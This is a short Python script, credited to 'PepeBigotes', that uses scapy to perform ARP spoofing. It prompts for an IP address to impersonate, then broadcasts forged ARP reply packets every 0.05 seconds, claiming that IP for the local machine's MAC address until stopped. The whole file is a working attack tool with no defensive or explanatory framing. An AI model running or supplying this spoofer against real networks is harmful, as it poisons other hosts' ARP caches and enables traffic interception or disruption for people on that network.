#!/usr/bin/env python3
#Created by PepeBigotes

from scapy.all import *


try:
    SRCMAC = Ether().src
    SRCIP = input("IP to spoof: ")
    DSTMAC = 'ff:ff:ff:ff:ff:ff'
    DSTIP = '255.255.255.255'

    print(f"SRC: {SRCMAC} ; {SRCIP}")
    print(f"DST: {DSTMAC} ; {DSTIP}")

    pkt = Ether(src=SRCMAC, dst=DSTMAC)/\
          ARP(op=2, hwsrc=SRCMAC, psrc=SRCIP, hwdst=DSTMAC, pdst=DSTIP)

    print("Sending packets, press CTRL+C to stop.")
    sendp(pkt, loop=1, inter=0.05)
except KeyboardInterrupt:
    print('\nKeyboardInterrupt')
    exit()